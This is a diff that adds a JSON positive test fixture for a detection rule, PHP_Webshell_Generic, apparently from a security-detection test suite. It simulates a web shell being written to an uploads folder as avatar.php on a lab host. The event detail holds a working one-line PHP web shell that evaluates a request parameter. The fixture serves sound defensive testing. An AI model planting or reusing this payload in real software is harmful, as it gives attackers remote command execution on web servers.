@@ -1,0 +1,21 @@
+{
+  "description": "positive fixture for PHP_Webshell_Generic",
+  "event": {
+    "action": "file_create",
+    "category": "file",
+    "detail": "<?php eval($_REQUEST['cmd']); ?>",
+    "event_id": "file_create",
+    "host": "WEB-LAB-01",
+    "ip": "198.51.100.50",
+    "path": "/var/www/html/uploads/avatar.php",
+    "process": "nginx",
+    "product": "linux",
+    "timestamp": "2025-06-01T12:15:00Z",
+    "user": "www-data"
+  },
+  "expect": [
+    "PHP_Webshell_Generic"
+  ],
+  "kind": "yara",
+  "rule": "PHP_Webshell_Generic"
+}
